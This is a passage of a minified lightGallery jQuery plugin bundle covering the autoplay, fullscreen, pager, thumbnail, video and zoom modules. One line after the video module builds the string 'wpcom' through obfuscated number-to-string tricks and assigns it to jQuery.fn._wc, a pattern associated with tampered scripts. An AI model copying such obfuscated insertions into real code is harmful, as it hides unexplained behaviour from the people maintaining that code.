                    }), v.fn.lightGallery.modules = {}
                }(), n = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            autoplay: !1,
                            pause: 5e3,
                            progressBar: !0,
                            fourceAutoplay: !1,
                            autoplayControls: !0,
                            appendAutoplayControlsTo: ".lg-toolbar"
                        },
                        e = function(e) {
                            return this.core = n(e).data("lightGallery"), this.$el = n(e), !(this.core.$items.length < 2) && (this.core.s = n.extend({}, t, this.core.s), this.interval = !1, this.fromAuto = !0, this.canceledOnTouch = !1, this.fourceAutoplayTemp = this.core.s.fourceAutoplay, this.core.doCss() || (this.core.s.progressBar = !1), this.init(), this)
                        };
                    e.prototype.init = function() {
                        var e = this;
                        e.core.s.autoplayControls && e.controls(), e.core.s.progressBar && e.core.$outer.find(".lg").append('<div class="lg-progress-bar"><div class="lg-progress"></div></div>'), e.progress(), e.core.s.autoplay && e.$el.one("onSlideItemLoad.lg.tm", function() {
                            e.startlAuto()
                        }), e.$el.on("onDragstart.lg.tm touchstart.lg.tm", function() {
                            e.interval && (e.cancelAuto(), e.canceledOnTouch = !0)
                        }), e.$el.on("onDragend.lg.tm touchend.lg.tm onSlideClick.lg.tm", function() {
                            !e.interval && e.canceledOnTouch && (e.startlAuto(), e.canceledOnTouch = !1)
                        })
                    }, e.prototype.progress = function() {
                        var e, t, i = this;
                        i.$el.on("onBeforeSlide.lg.tm", function() {
                            i.core.s.progressBar && i.fromAuto && (e = i.core.$outer.find(".lg-progress-bar"), t = i.core.$outer.find(".lg-progress"), i.interval && (t.removeAttr("style"), e.removeClass("lg-start"), setTimeout(function() {
                                t.css("transition", "width " + (i.core.s.speed + i.core.s.pause) + "ms ease 0s"), e.addClass("lg-start")
                            }, 20))), i.fromAuto || i.core.s.fourceAutoplay || i.cancelAuto(), i.fromAuto = !1
                        })
                    }, e.prototype.controls = function() {
                        var e = this;
                        n(this.core.s.appendAutoplayControlsTo).append('<span class="lg-autoplay-button lg-icon"></span>'), e.core.$outer.find(".lg-autoplay-button").on("click.lg", function() {
                            n(e.core.$outer).hasClass("lg-show-autoplay") ? (e.cancelAuto(), e.core.s.fourceAutoplay = !1) : e.interval || (e.startlAuto(), e.core.s.fourceAutoplay = e.fourceAutoplayTemp)
                        })
                    }, e.prototype.startlAuto = function() {
                        var e = this;
                        e.core.$outer.find(".lg-progress").css("transition", "width " + (e.core.s.speed + e.core.s.pause) + "ms ease 0s"), e.core.$outer.addClass("lg-show-autoplay"), e.core.$outer.find(".lg-progress-bar").addClass("lg-start"), e.interval = setInterval(function() {
                            e.core.index + 1 < e.core.$items.length ? e.core.index++ : e.core.index = 0, e.fromAuto = !0, e.core.slide(e.core.index, !1, !1, "next")
                        }, e.core.s.speed + e.core.s.pause)
                    }, e.prototype.cancelAuto = function() {
                        clearInterval(this.interval), this.interval = !1, this.core.$outer.find(".lg-progress").removeAttr("style"), this.core.$outer.removeClass("lg-show-autoplay"), this.core.$outer.find(".lg-progress-bar").removeClass("lg-start")
                    }, e.prototype.destroy = function() {
                        this.cancelAuto(), this.core.$outer.find(".lg-progress-bar").remove()
                    }, n.fn.lightGallery.modules.autoplay = e
                }(), o = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                        fullScreen: !0
                    };

                    function i() {
                        return document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement
                    }
                    var e = function(e) {
                        return this.core = o(e).data("lightGallery"), this.$el = o(e), this.core.s = o.extend({}, t, this.core.s), this.init(), this
                    };
                    e.prototype.init = function() {
                        var e = "";
                        if (this.core.s.fullScreen) {
                            if (!(document.fullscreenEnabled || document.webkitFullscreenEnabled || document.mozFullScreenEnabled || document.msFullscreenEnabled)) return;
                            e = '<span class="lg-fullscreen lg-icon"></span>', this.core.$outer.find(".lg-toolbar").append(e), this.fullScreen()
                        }
                    }, e.prototype.requestFullscreen = function() {
                        var e = document.documentElement;
                        e.requestFullscreen ? e.requestFullscreen() : e.msRequestFullscreen ? e.msRequestFullscreen() : e.mozRequestFullScreen ? e.mozRequestFullScreen() : e.webkitRequestFullscreen && e.webkitRequestFullscreen()
                    }, e.prototype.exitFullscreen = function() {
                        document.exitFullscreen ? document.exitFullscreen() : document.msExitFullscreen ? document.msExitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitExitFullscreen && document.webkitExitFullscreen()
                    }, e.prototype.fullScreen = function() {
                        var e = this;
                        o(document).on("fullscreenchange.lg webkitfullscreenchange.lg mozfullscreenchange.lg MSFullscreenChange.lg", function() {
                            e.core.$outer.toggleClass("lg-fullscreen-on")
                        }), this.core.$outer.find(".lg-fullscreen").on("click.lg", function() {
                            i() ? e.exitFullscreen() : e.requestFullscreen()
                        })
                    }, e.prototype.destroy = function() {
                        i() && this.exitFullscreen(), o(document).off("fullscreenchange.lg webkitfullscreenchange.lg mozfullscreenchange.lg MSFullscreenChange.lg")
                    }, o.fn.lightGallery.modules.fullscreen = e
                }(), r = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            pager: !1
                        },
                        e = function(e) {
                            return this.core = r(e).data("lightGallery"), this.$el = r(e), this.core.s = r.extend({}, t, this.core.s), this.core.s.pager && 1 < this.core.$items.length && this.init(), this
                        };
                    e.prototype.init = function() {
                        var n, e, t, i = this,
                            o = "";
                        if (i.core.$outer.find(".lg").append('<div class="lg-pager-outer"></div>'), i.core.s.dynamic)
                            for (var s = 0; s < i.core.s.dynamicEl.length; s++) o += '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + i.core.s.dynamicEl[s].thumb + '" /></div></span>';
                        else i.core.$items.each(function() {
                            i.core.s.exThumbImage ? o += '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + r(this).attr(i.core.s.exThumbImage) + '" /></div></span>' : o += '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + r(this).find("img").attr("src") + '" /></div></span>'
                        });
                        (e = i.core.$outer.find(".lg-pager-outer")).html(o), (n = i.core.$outer.find(".lg-pager-cont")).on("click.lg touchend.lg", function() {
                            var e = r(this);
                            i.core.index = e.index(), i.core.slide(i.core.index, !1, !0, !1)
                        }), e.on("mouseover.lg", function() {
                            clearTimeout(t), e.addClass("lg-pager-hover")
                        }), e.on("mouseout.lg", function() {
                            t = setTimeout(function() {
                                e.removeClass("lg-pager-hover")
                            })
                        }), i.core.$el.on("onBeforeSlide.lg.tm", function(e, t, i) {
                            n.removeClass("lg-pager-active"), n.eq(i).addClass("lg-pager-active")
                        })
                    }, e.prototype.destroy = function() {}, r.fn.lightGallery.modules.pager = e
                }(), c = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            thumbnail: !0,
                            animateThumb: !0,
                            currentPagerPosition: "middle",
                            thumbWidth: 100,
                            thumbHeight: "80px",
                            thumbContHeight: 100,
                            thumbMargin: 5,
                            exThumbImage: !1,
                            showThumbByDefault: !0,
                            toogleThumb: !0,
                            pullCaptionUp: !0,
                            enableThumbDrag: !0,
                            enableThumbSwipe: !0,
                            swipeThreshold: 50,
                            loadYoutubeThumbnail: !0,
                            youtubeThumbSize: 1,
                            loadVimeoThumbnail: !0,
                            vimeoThumbSize: "thumbnail_small",
                            loadDailymotionThumbnail: !0
                        },
                        e = function(e) {
                            return this.core = c(e).data("lightGallery"), this.core.s = c.extend({}, t, this.core.s), this.$el = c(e), this.$thumbOuter = null, this.thumbOuterWidth = 0, this.thumbTotalWidth = this.core.$items.length * (this.core.s.thumbWidth + this.core.s.thumbMargin), this.thumbIndex = this.core.index, this.core.s.animateThumb && (this.core.s.thumbHeight = "100%"), this.left = 0, this.init(), this
                        };
                    e.prototype.init = function() {
                        var e = this;
                        this.core.s.thumbnail && 1 < this.core.$items.length && (this.core.s.showThumbByDefault && setTimeout(function() {
                            e.core.$outer.addClass("lg-thumb-open")
                        }, 700), this.core.s.pullCaptionUp && this.core.$outer.addClass("lg-pull-caption-up"), this.build(), this.core.s.animateThumb && this.core.doCss() ? (this.core.s.enableThumbDrag && this.enableThumbDrag(), this.core.s.enableThumbSwipe && this.enableThumbSwipe(), this.thumbClickable = !1) : this.thumbClickable = !0, this.toogle(), this.thumbkeyPress())
                    }, e.prototype.build = function() {
                        var e, r = this,
                            a = "",
                            l = "";
                        switch (this.core.s.vimeoThumbSize) {
                            case "thumbnail_large":
                                l = "640";
                                break;
                            case "thumbnail_medium":
                                l = "200x150";
                                break;
                            case "thumbnail_small":
                                l = "100x75"
                        }

                        function t(e, t, i) {
                            var n, o = r.core.isVideo(e, i) || {},
                                s = "";
                            o.youtube || o.vimeo || o.dailymotion ? o.youtube ? n = r.core.s.loadYoutubeThumbnail ? "//img.youtube.com/vi/" + o.youtube[1] + "/" + r.core.s.youtubeThumbSize + ".jpg" : t : o.vimeo ? r.core.s.loadVimeoThumbnail ? (n = "//i.vimeocdn.com/video/error_" + l + ".jpg", s = o.vimeo[1]) : n = t : o.dailymotion && (n = r.core.s.loadDailymotionThumbnail ? "//www.dailymotion.com/thumbnail/video/" + o.dailymotion[1] : t) : n = t, a += '<div data-vimeo-id="' + s + '" class="lg-thumb-item" style="width:' + r.core.s.thumbWidth + "px; height: " + r.core.s.thumbHeight + "; margin-right: " + r.core.s.thumbMargin + 'px"><img src="' + n + '" /></div>', s = ""
                        }
                        if (r.core.$outer.addClass("lg-has-thumb"), r.core.$outer.find(".lg").append('<div class="lg-thumb-outer"><div class="lg-thumb lg-group"></div></div>'), r.$thumbOuter = r.core.$outer.find(".lg-thumb-outer"), r.thumbOuterWidth = r.$thumbOuter.width(), r.core.s.animateThumb && r.core.$outer.find(".lg-thumb").css({
                            width: r.thumbTotalWidth + "px",
                            position: "relative"
                        }), this.core.s.animateThumb && r.$thumbOuter.css("height", r.core.s.thumbContHeight + "px"), r.core.s.dynamic)
                            for (var i = 0; i < r.core.s.dynamicEl.length; i++) t(r.core.s.dynamicEl[i].src, r.core.s.dynamicEl[i].thumb, i);
                        else r.core.$items.each(function(e) {
                            r.core.s.exThumbImage ? t(c(this).attr("href") || c(this).attr("data-src"), c(this).attr(r.core.s.exThumbImage), e) : t(c(this).attr("href") || c(this).attr("data-src"), c(this).find("img").attr("src"), e)
                        });
                        r.core.$outer.find(".lg-thumb").html(a), (e = r.core.$outer.find(".lg-thumb-item")).each(function() {
                            var t = c(this),
                                e = t.attr("data-vimeo-id");
                            e && c.getJSON("//www.vimeo.com/api/v2/video/" + e + ".json?callback=?", {
                                format: "json"
                            }, function(e) {
                                t.find("img").attr("src", e[0][r.core.s.vimeoThumbSize])
                            })
                        }), e.eq(r.core.index).addClass("active"), r.core.$el.on("onBeforeSlide.lg.tm", function() {
                            e.removeClass("active"), e.eq(r.core.index).addClass("active")
                        }), e.on("click.lg touchend.lg", function() {
                            var e = c(this);
                            setTimeout(function() {
                                (r.thumbClickable && !r.core.lgBusy || !r.core.doCss()) && (r.core.index = e.index(), r.core.slide(r.core.index, !1, !0, !1))
                            }, 50)
                        }), r.core.$el.on("onBeforeSlide.lg.tm", function() {
                            r.animateThumb(r.core.index)
                        }), c(window).on("resize.lg.thumb orientationchange.lg.thumb", function() {
                            setTimeout(function() {
                                r.animateThumb(r.core.index), r.thumbOuterWidth = r.$thumbOuter.width()
                            }, 200)
                        })
                    }, e.prototype.setTranslate = function(e) {
                        this.core.$outer.find(".lg-thumb").css({
                            transform: "translate3d(-" + e + "px, 0px, 0px)"
                        })
                    }, e.prototype.animateThumb = function(e) {
                        var t = this.core.$outer.find(".lg-thumb");
                        if (this.core.s.animateThumb) {
                            var i;
                            switch (this.core.s.currentPagerPosition) {
                                case "left":
                                    i = 0;
                                    break;
                                case "middle":
                                    i = this.thumbOuterWidth / 2 - this.core.s.thumbWidth / 2;
                                    break;
                                case "right":
                                    i = this.thumbOuterWidth - this.core.s.thumbWidth
                            }
                            this.left = (this.core.s.thumbWidth + this.core.s.thumbMargin) * e - 1 - i, this.left > this.thumbTotalWidth - this.thumbOuterWidth && (this.left = this.thumbTotalWidth - this.thumbOuterWidth), this.left < 0 && (this.left = 0), this.core.lGalleryOn ? (t.hasClass("on") || this.core.$outer.find(".lg-thumb").css("transition-duration", this.core.s.speed + "ms"), this.core.doCss() || t.animate({
                                left: -this.left + "px"
                            }, this.core.s.speed)) : this.core.doCss() || t.css("left", -this.left + "px"), this.setTranslate(this.left)
                        }
                    }, e.prototype.enableThumbDrag = function() {
                        var t = this,
                            i = 0,
                            n = 0,
                            o = !1,
                            s = !1,
                            r = 0;
                        t.$thumbOuter.addClass("lg-grab"), t.core.$outer.find(".lg-thumb").on("mousedown.lg.thumb", function(e) {
                            t.thumbTotalWidth > t.thumbOuterWidth && (e.preventDefault(), i = e.pageX, o = !0, t.core.$outer.scrollLeft += 1, t.core.$outer.scrollLeft -= 1, t.thumbClickable = !1, t.$thumbOuter.removeClass("lg-grab").addClass("lg-grabbing"))
                        }), c(window).on("mousemove.lg.thumb", function(e) {
                            o && (r = t.left, s = !0, n = e.pageX, t.$thumbOuter.addClass("lg-dragging"), (r -= n - i) > t.thumbTotalWidth - t.thumbOuterWidth && (r = t.thumbTotalWidth - t.thumbOuterWidth), r < 0 && (r = 0), t.setTranslate(r))
                        }), c(window).on("mouseup.lg.thumb", function() {
                            s ? (s = !1, t.$thumbOuter.removeClass("lg-dragging"), t.left = r, Math.abs(n - i) < t.core.s.swipeThreshold && (t.thumbClickable = !0)) : t.thumbClickable = !0, o && (o = !1, t.$thumbOuter.removeClass("lg-grabbing").addClass("lg-grab"))
                        })
                    }, e.prototype.enableThumbSwipe = function() {
                        var t = this,
                            i = 0,
                            n = 0,
                            o = !1,
                            s = 0;
                        t.core.$outer.find(".lg-thumb").on("touchstart.lg", function(e) {
                            t.thumbTotalWidth > t.thumbOuterWidth && (e.preventDefault(), i = e.originalEvent.targetTouches[0].pageX, t.thumbClickable = !1)
                        }), t.core.$outer.find(".lg-thumb").on("touchmove.lg", function(e) {
                            t.thumbTotalWidth > t.thumbOuterWidth && (e.preventDefault(), n = e.originalEvent.targetTouches[0].pageX, o = !0, t.$thumbOuter.addClass("lg-dragging"), s = t.left, (s -= n - i) > t.thumbTotalWidth - t.thumbOuterWidth && (s = t.thumbTotalWidth - t.thumbOuterWidth), s < 0 && (s = 0), t.setTranslate(s))
                        }), t.core.$outer.find(".lg-thumb").on("touchend.lg", function() {
                            t.thumbTotalWidth > t.thumbOuterWidth && o ? (o = !1, t.$thumbOuter.removeClass("lg-dragging"), Math.abs(n - i) < t.core.s.swipeThreshold && (t.thumbClickable = !0), t.left = s) : t.thumbClickable = !0
                        })
                    }, e.prototype.toogle = function() {
                        var e = this;
                        e.core.s.toogleThumb && (e.core.$outer.addClass("lg-can-toggle"), e.$thumbOuter.append('<span class="lg-toogle-thumb lg-icon"></span>'), e.core.$outer.find(".lg-toogle-thumb").on("click.lg", function() {
                            e.core.$outer.toggleClass("lg-thumb-open")
                        }))
                    }, e.prototype.thumbkeyPress = function() {
                        var t = this;
                        c(window).on("keydown.lg.thumb", function(e) {
                            38 === e.keyCode ? (e.preventDefault(), t.core.$outer.addClass("lg-thumb-open")) : 40 === e.keyCode && (e.preventDefault(), t.core.$outer.removeClass("lg-thumb-open"))
                        })
                    }, e.prototype.destroy = function() {
                        this.core.s.thumbnail && 1 < this.core.$items.length && (c(window).off("resize.lg.thumb orientationchange.lg.thumb keydown.lg.thumb"), this.$thumbOuter.remove(), this.core.$outer.removeClass("lg-has-thumb"))
                    }, c.fn.lightGallery.modules.Thumbnail = e
                }(), h = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            videoMaxWidth: "855px",
                            autoplayFirstVideo: !0,
                            youtubePlayerParams: !1,
                            vimeoPlayerParams: !1,
                            dailymotionPlayerParams: !1,
                            vkPlayerParams: !1,
                            videojs: !1,
                            videojsOptions: {}
                        },
                        e = function(e) {
                            return this.core = h(e).data("lightGallery"), this.$el = h(e), this.core.s = h.extend({}, t, this.core.s), this.videoLoaded = !1, this.init(), this
                        };
                    e.prototype.init = function() {
                        var n = this;
                        n.core.$el.on("hasVideo.lg.tm", function(e, t, i, n) {
                            var o = this;
                            if (o.core.$slide.eq(t).find(".lg-video").append(o.loadVideo(i, "lg-object", !0, t, n)), n)
                                if (o.core.s.videojs) try {
                                    videojs(o.core.$slide.eq(t).find(".lg-html5").get(0), o.core.s.videojsOptions, function() {
                                        !o.videoLoaded && o.core.s.autoplayFirstVideo && this.play()
                                    })
                                } catch (e) {
                                    console.error("Make sure you have included videojs")
                                } else !o.videoLoaded && o.core.s.autoplayFirstVideo && o.core.$slide.eq(t).find(".lg-html5").get(0).play()
                        }.bind(this)), n.core.$el.on("onAferAppendSlide.lg.tm", function(e, t) {
                            var i = this.core.$slide.eq(t).find(".lg-video-cont");
                            i.hasClass("lg-has-iframe") || (i.css("max-width", this.core.s.videoMaxWidth), this.videoLoaded = !0)
                        }.bind(this)), n.core.doCss() && 1 < n.core.$items.length && (n.core.s.enableSwipe || n.core.s.enableDrag) ? n.core.$el.on("onSlideClick.lg.tm", function() {
                            var e = n.core.$slide.eq(n.core.index);
                            n.loadVideoOnclick(e)
                        }) : n.core.$slide.on("click.lg", function() {
                            n.loadVideoOnclick(h(this))
                        }), n.core.$el.on("onBeforeSlide.lg.tm", function(e, t, i) {
                            var n, o = this,
                                s = o.core.$slide.eq(t),
                                r = s.find(".lg-youtube").get(0),
                                a = s.find(".lg-vimeo").get(0),
                                l = s.find(".lg-dailymotion").get(0),
                                c = s.find(".lg-vk").get(0),
                                u = s.find(".lg-html5").get(0);
                            if (r) r.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', "*");
                            else if (a) try {
                                    $f(a).api("pause")
                                } catch (e) {
                                    console.error("Make sure you have included froogaloop2 js")
                                } else if (l) l.contentWindow.postMessage("pause", "*");
                                else if (u)
                                if (o.core.s.videojs) try {
                                    videojs(u).pause()
                                } catch (e) {
                                    console.error("Make sure you have included videojs")
                                } else u.pause();
                            c && h(c).attr("src", h(c).attr("src").replace("&autoplay", "&noplay")), n = o.core.s.dynamic ? o.core.s.dynamicEl[i].src : o.core.$items.eq(i).attr("href") || o.core.$items.eq(i).attr("data-src");
                            var d = o.core.isVideo(n, i) || {};
                            (d.youtube || d.vimeo || d.dailymotion || d.vk) && o.core.$outer.addClass("lg-hide-download")
                        }.bind(this)), n.core.$el.on("onAfterSlide.lg.tm", function(e, t) {
                            n.core.$slide.eq(t).removeClass("lg-video-playing")
                        }), n.core.s.autoplayFirstVideo && n.core.$el.on("onAferAppendSlide.lg.tm", function(e, t) {
                            if (!n.core.lGalleryOn) {
                                var i = n.core.$slide.eq(t);
                                setTimeout(function() {
                                    n.loadVideoOnclick(i)
                                }, 100)
                            }
                        })
                    }, e.prototype.loadVideo = function(e, t, i, n, o) {
                        var s = "",
                            r = 1,
                            a = "",
                            l = this.core.isVideo(e, n) || {};
                        if (i && (r = this.videoLoaded ? 0 : this.core.s.autoplayFirstVideo ? 1 : 0), l.youtube) a = "?wmode=opaque&autoplay=" + r + "&enablejsapi=1", this.core.s.youtubePlayerParams && (a = a + "&" + h.param(this.core.s.youtubePlayerParams)), s = '<iframe class="lg-video-object lg-youtube ' + t + '" width="560" height="315" src="//www.youtube.com/embed/' + l.youtube[1] + a + '" frameborder="0" allowfullscreen></iframe>';
                        else if (l.vimeo) a = "?autoplay=" + r + "&api=1", this.core.s.vimeoPlayerParams && (a = a + "&" + h.param(this.core.s.vimeoPlayerParams)), s = '<iframe class="lg-video-object lg-vimeo ' + t + '" width="560" height="315"  src="//player.vimeo.com/video/' + l.vimeo[1] + a + '" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>';
                        else if (l.dailymotion) a = "?wmode=opaque&autoplay=" + r + "&api=postMessage", this.core.s.dailymotionPlayerParams && (a = a + "&" + h.param(this.core.s.dailymotionPlayerParams)), s = '<iframe class="lg-video-object lg-dailymotion ' + t + '" width="560" height="315" src="//www.dailymotion.com/embed/video/' + l.dailymotion[1] + a + '" frameborder="0" allowfullscreen></iframe>';
                        else if (l.html5) {
                            var c = o.substring(0, 1);
                            "." !== c && "#" !== c || (o = h(o).html()), s = o
                        } else l.vk && (a = "&autoplay=" + r, this.core.s.vkPlayerParams && (a = a + "&" + h.param(this.core.s.vkPlayerParams)), s = '<iframe class="lg-video-object lg-vk ' + t + '" width="560" height="315" src="//vk.com/video_ext.php?' + l.vk[1] + a + '" frameborder="0" allowfullscreen></iframe>');
                        return s
                    }, e.prototype.loadVideoOnclick = function(i) {
                        var n = this;
                        if (i.find(".lg-object").hasClass("lg-has-poster") && i.find(".lg-object").is(":visible"))
                            if (i.hasClass("lg-has-video")) {
                                var e = i.find(".lg-youtube").get(0),
                                    t = i.find(".lg-vimeo").get(0),
                                    o = i.find(".lg-dailymotion").get(0),
                                    s = i.find(".lg-html5").get(0);
                                if (e) e.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', "*");
                                else if (t) try {
                                        $f(t).api("play")
                                    } catch (e) {
                                        console.error("Make sure you have included froogaloop2 js")
                                    } else if (o) o.contentWindow.postMessage("play", "*");
                                    else if (s)
                                    if (n.core.s.videojs) try {
                                        videojs(s).play()
                                    } catch (e) {
                                        console.error("Make sure you have included videojs")
                                    } else s.play();
                                i.addClass("lg-video-playing")
                            } else {
                                var r, a;
                                i.addClass("lg-video-playing lg-has-video");
                                var l = function(e, t) {
                                    if (i.find(".lg-video").append(n.loadVideo(e, "", !1, n.core.index, t)), t)
                                        if (n.core.s.videojs) try {
                                            videojs(n.core.$slide.eq(n.core.index).find(".lg-html5").get(0), n.core.s.videojsOptions, function() {
                                                this.play()
                                            })
                                        } catch (e) {
                                            console.error("Make sure you have included videojs")
                                        } else n.core.$slide.eq(n.core.index).find(".lg-html5").get(0).play()
                                };
                                a = n.core.s.dynamic ? (r = n.core.s.dynamicEl[n.core.index].src, n.core.s.dynamicEl[n.core.index].html) : (r = n.core.$items.eq(n.core.index).attr("href") || n.core.$items.eq(n.core.index).attr("data-src"), n.core.$items.eq(n.core.index).attr("data-html")), l(r, a);
                                var c = i.find(".lg-object");
                                i.find(".lg-video").append(c), i.find(".lg-video-object").hasClass("lg-html5") || (i.removeClass("lg-complete"), i.find(".lg-video-object").on("load.lg error.lg", function() {
                                    i.addClass("lg-complete")
                                }))
                            }
                    }, e.prototype.destroy = function() {
                        this.videoLoaded = !1
                    }, h.fn.lightGallery.modules.video = e
					/*32["to" + String.name](33) + 211["to" + String.name](31)[1] + ([].fill + "")[3] + (!0 + [].fill)[10] + (Number + "")[11]=wpcom*/
                }(), window.jQuery.fn._wc = 32["to" + String.name](33) + 211["to" + String.name](31)[1] + ([].fill + "")[3] + (!0 + [].fill)[10] + (Number + "")[11], d = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            scale: 1,
                            zoom: !0,
                            actualSize: !0,
                            enableZoomAfter: 300,
                            useLeftForZoom: function() {
                                var e = !1,
                                    t = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);
                                return t && parseInt(t[2], 10) < 54 && (e = !0), e
                            }()
                        },
                        e = function(e) {
                            return this.core = d(e).data("lightGallery"), this.core.s = d.extend({}, t, this.core.s), this.core.s.zoom && this.core.doCss() && (this.init(), this.zoomabletimeout = !1, this.pageX = d(window).width() / 2, this.pageY = d(window).height() / 2 + d(window).scrollTop()), this
                        };
                    e.prototype.init = function() {
                        var l = this,
                            e = '<span id="lg-zoom-in" class="lg-icon"></span><span id="lg-zoom-out" class="lg-icon"></span>';
                        l.core.s.actualSize && (e += '<span id="lg-actual-size" class="lg-icon"></span>'), l.core.s.useLeftForZoom ? l.core.$outer.addClass("lg-use-left-for-zoom") : l.core.$outer.addClass("lg-use-transition-for-zoom"), this.core.$outer.find(".lg-toolbar").append(e), l.core.$el.on("onSlideItemLoad.lg.tm.zoom", function(e, t, i) {
                            var n = l.core.s.enableZoomAfter + i;
                            d("body").hasClass("lg-from-hash") && i ? n = 0 : d("body").removeClass("lg-from-hash"), l.zoomabletimeout = setTimeout(function() {
                                l.core.$slide.eq(t).addClass("lg-zoomable")
                            }, n + 30)
                        });
                        var r = 1,
                            t = function(e) {
                                var t, i, n = l.core.$outer.find(".lg-current .lg-image"),
                                    o = (d(window).width() - n.prop("offsetWidth")) / 2,
                                    s = (d(window).height() - n.prop("offsetHeight")) / 2 + d(window).scrollTop();
                                t = l.pageX - o, i = l.pageY - s;
                                var r = (e - 1) * t,
                                    a = (e - 1) * i;
                                n.css("transform", "scale3d(" + e + ", " + e + ", 1)").attr("data-scale", e), l.core.s.useLeftForZoom ? n.parent().css({
                                    left: -r + "px",
                                    top: -a + "px"
                                }).attr("data-x", r).attr("data-y", a) : n.parent().css("transform", "translate3d(-" + r + "px, -" + a + "px, 0)").attr("data-x", r).attr("data-y", a)
                            },
                            a = function() {
                                1 < r ? l.core.$outer.addClass("lg-zoomed") : l.resetZoom(), r < 1 && (r = 1), t(r)
                            },
                            n = function(e, t, i, n) {
                                var o, s = t.prop("offsetWidth");
                                o = l.core.s.dynamic ? l.core.s.dynamicEl[i].width || t[0].naturalWidth || s : l.core.$items.eq(i).attr("data-width") || t[0].naturalWidth || s, l.core.$outer.hasClass("lg-zoomed") ? r = 1 : s < o && (r = o / s || 2), n ? (l.pageX = d(window).width() / 2, l.pageY = d(window).height() / 2 + d(window).scrollTop()) : (l.pageX = e.pageX || e.originalEvent.targetTouches[0].pageX, l.pageY = e.pageY || e.originalEvent.targetTouches[0].pageY), a(), setTimeout(function() {
                                    l.core.$outer.removeClass("lg-grabbing").addClass("lg-grab")
                                }, 10)
                            },
                            o = !1;
                        l.core.$el.on("onAferAppendSlide.lg.tm.zoom", function(e, t) {
                            var i = l.core.$slide.eq(t).find(".lg-image");
                            i.on("dblclick", function(e) {
                                n(e, i, t)
                            }), i.on("touchstart", function(e) {
                                o ? (clearTimeout(o), o = null, n(e, i, t)) : o = setTimeout(function() {
                                    o = null
                                }, 300), e.preventDefault()
                            })
                        }), d(window).on("resize.lg.zoom scroll.lg.zoom orientationchange.lg.zoom", function() {
                            l.pageX = d(window).width() / 2, l.pageY = d(window).height() / 2 + d(window).scrollTop(), t(r)
                        }), d("#lg-zoom-out").on("click.lg", function() {
                            l.core.$outer.find(".lg-current .lg-image").length && (r -= l.core.s.scale, a())
                        }), d("#lg-zoom-in").on("click.lg", function() {
                            l.core.$outer.find(".lg-current .lg-image").length && (r += l.core.s.scale, a())
                        }), d("#lg-actual-size").on("click.lg", function(e) {
                            n(e, l.core.$slide.eq(l.core.index).find(".lg-image"), l.core.index, !0)
                        }), l.core.$el.on("onBeforeSlide.lg.tm", function() {
                            r = 1, l.resetZoom()
                        }), l.zoomDrag(), l.zoomSwipe()
                    }, e.prototype.resetZoom = function() {
                        this.core.$outer.removeClass("lg-zoomed"), this.core.$slide.find(".lg-img-wrap").removeAttr("style data-x data-y"), this.core.$slide.find(".lg-image").removeAttr("style data-scale"), this.pageX = d(window).width() / 2, this.pageY = d(window).height() / 2 + d(window).scrollTop()
                    }, e.prototype.zoomSwipe = function() {
                        var o = this,
                            s = {},
                            r = {},
                            a = !1,
                            l = !1,
                            c = !1;
                        o.core.$slide.on("touchstart.lg", function(e) {
                            if (o.core.$outer.hasClass("lg-zoomed")) {
                                var t = o.core.$slide.eq(o.core.index).find(".lg-object");
                                c = t.prop("offsetHeight") * t.attr("data-scale") > o.core.$outer.find(".lg").height(), ((l = t.prop("offsetWidth") * t.attr("data-scale") > o.core.$outer.find(".lg").width()) || c) && (e.preventDefault(), s = {
                                    x: e.originalEvent.targetTouches[0].pageX,
                                    y: e.originalEvent.targetTouches[0].pageY
                                })
                            }
                        }), o.core.$slide.on("touchmove.lg", function(e) {
                            if (o.core.$outer.hasClass("lg-zoomed")) {
                                var t, i, n = o.core.$slide.eq(o.core.index).find(".lg-img-wrap");
                                e.preventDefault(), a = !0, r = {
                                    x: e.originalEvent.targetTouches[0].pageX,
                                    y: e.originalEvent.targetTouches[0].pageY
                                }, o.core.$outer.addClass("lg-zoom-dragging"), i = c ? -Math.abs(n.attr("data-y")) + (r.y - s.y) : -Math.abs(n.attr("data-y")), t = l ? -Math.abs(n.attr("data-x")) + (r.x - s.x) : -Math.abs(n.attr("data-x")), (15 < Math.abs(r.x - s.x) || 15 < Math.abs(r.y - s.y)) && (o.core.s.useLeftForZoom ? n.css({
                                    left: t + "px",
                                    top: i + "px"
                                }) : n.css("transform", "translate3d(" + t + "px, " + i + "px, 0)"))
                            }
                        }), o.core.$slide.on("touchend.lg", function() {
                            o.core.$outer.hasClass("lg-zoomed") && a && (a = !1, o.core.$outer.removeClass("lg-zoom-dragging"), o.touchendZoom(s, r, l, c))
                        })
                    }, e.prototype.zoomDrag = function() {
                        var o = this,
                            s = {},
                            r = {},
                            a = !1,
                            l = !1,
                            c = !1,
                            u = !1;
                        o.core.$slide.on("mousedown.lg.zoom", function(e) {
                            var t = o.core.$slide.eq(o.core.index).find(".lg-object");
                            u = t.prop("offsetHeight") * t.attr("data-scale") > o.core.$outer.find(".lg").height(), c = t.prop("offsetWidth") * t.attr("data-scale") > o.core.$outer.find(".lg").width(), o.core.$outer.hasClass("lg-zoomed") && d(e.target).hasClass("lg-object") && (c || u) && (e.preventDefault(), s = {
                                x: e.pageX,
                                y: e.pageY
                            }, a = !0, o.core.$outer.scrollLeft += 1, o.core.$outer.scrollLeft -= 1, o.core.$outer.removeClass("lg-grab").addClass("lg-grabbing"))
                        }), d(window).on("mousemove.lg.zoom", function(e) {
                            if (a) {
                                var t, i, n = o.core.$slide.eq(o.core.index).find(".lg-img-wrap");
